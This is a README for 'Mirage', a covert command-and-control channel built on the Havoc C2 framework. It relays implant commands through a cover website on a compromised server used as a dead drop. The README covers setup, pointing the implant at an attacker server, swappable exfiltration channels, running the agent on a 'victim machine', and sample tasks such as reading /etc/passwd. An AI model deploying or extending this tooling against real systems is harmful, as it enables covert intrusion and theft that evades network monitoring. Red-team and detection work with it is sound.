# Mirage
**Mirage** is a custom C3 (Custom Communication Channel) built on top of the [Havoc C2 Framework](https://github.com/HavocFramework/Havoc). It routes agent traffic covertly through a public-facing website turning ordinary HTTP endpoints into a fully functional command-and-control channel.

The teamserver never speaks directly to the agent. Instead, commands and responses flow through a website acting as a dead drop, making traffic indistinguishable from normal web activity.

---

## How It Works

<img width="1669" height="633" alt="image" src="https://github.com/user-attachments/assets/75da7522-e93c-4ec4-8d07-c3ba0525d84a" />


**Step by step:**

1. Operator types a command in the Havoc client
2. Havoc queues the task internally on the teamserver
3. `handler.py` receives the queued task via the service websocket
4. `handler.py` uploads the encoded command to the website via `POST /api/sync`
5. Agent polls the website for new commands via `GET /api/telemetry`
6. Website returns the encoded command to the agent
7. Agent executes the command and uploads the response via `POST /api/telemetry`
8. `handler.py` fetches the agent response from the website via `GET /api/sync`
9. `handler.py` forwards the response back to the Havoc teamserver over websocket
10. Output appears in the Havoc client UI

The website is the covert dead drop. The teamserver and the agent never communicate directly.

---

## Project Structure

```
mirage/
├── havoc/       # Havoc C2 service Python bindings (must stay alongside handler.py)
├── agent.py     # Implant -- runs on the victim machine
├── handler.py   # Registers the agent with Havoc, relays tasks and output both ways
└── main.py      # Flask cover website + dead drop endpoints
```

### Component Breakdown

| File | Role | Runs on |
|------|------|---------|
| `main.py` | Cover website + `/api/telemetry` and `/api/sync` dead drop endpoints | Compromised web server |
| `handler.py` | Registers agent with Havoc teamserver, polls Flask, relays tasks and output via websocket | Attacker machine |
| `agent.py` | Beacons in, picks up tasks, executes commands, returns output via Flask | Victim machine |

`listener.py` no longer exists as a separate process. `handler.py` absorbs the full relay loop internally as a background polling thread, keeping the codebase to three files.

---

# Getting Started

## Prerequisites

- [Havoc C2 Framework](https://github.com/HavocFramework/Havoc) cloned and built
- Python 3.10+
- Dependencies:

```bash
pip install flask requests websocket-client
```

## Setup

### 1. Clone the Repository

```bash
git clone https://github.com/yourname/mirage
cd mirage
```

### 2. Configure `handler.py`

Open `handler.py` and set your teamserver address and service password to match your Havoc profile:

```python
FLASK_URL = "http://127.0.0.1:4696"

# inside main()
havoc_service = HavocService(
    endpoint="wss://127.0.0.1:40056/service-endpoint",
    password="service-password"
)
```

### 3. Configure `agent.py`

Point the agent at your Flask server:

```python
URL = "http://<your-server-ip>:4696"
```

### 4. Implement Your Own Channel (Optional)

The dead-drop channel is fully swappable. Two functions in both `agent.py` and `handler.py` control all data movement:

```python
def uploadData(data: str):
    """
    Receives a Base64 string.
    Send it over your chosen channel:
    HTTP POST, S3, DNS, Discord, etc.
    """
    pass

def downloadData() -> str:
    """
    Poll your channel for incoming data.
    Return the raw Base64 string from the other side.
    """
    pass
```

As long as `uploadData()` and `downloadData()` are inverse operations that round-trip Base64 cleanly, any transport works.

## Running Mirage

Start everything in the following order.

### Terminal 1 Havoc Teamserver

```bash
cd /path/to/Havoc
./havoc server --profile profiles/havoc.yaotl
```

Wait for:

```text
[INFO] Starting Teamserver on wss://0.0.0.0:40056
```

### Terminal 2 Flask Dead-Drop Website

```bash
python3 main.py
```

Wait for:

```text
[mirage] Aesthetic interface live on http://localhost:4696
```

### Terminal 3 Handler

```bash
python3 handler.py
```

Wait for:

<img width="664" height="727" alt="image" src="https://github.com/user-attachments/assets/9289cdec-876a-49ed-bf2d-80b38029e807" />


### Terminal 4 Havoc Client

```bash
./havoc client
```

Connect to your profile. You should see:
<img width="1129" height="739" alt="image" src="https://github.com/user-attachments/assets/d5130c19-50d6-46dd-aa7a-9136fa467134" />



### Terminal 5 Agent (Victim Machine)

```bash
python3 agent.py
```

### Havoc C3 output

```
shell whoami
shell id
shell pwd
shell ls -la
shell cat /etc/passwd
```

<img width="1168" height="810" alt="image" src="https://github.com/user-attachments/assets/e9ce1cdc-ae18-4327-a744-efb621bcd0dc" />


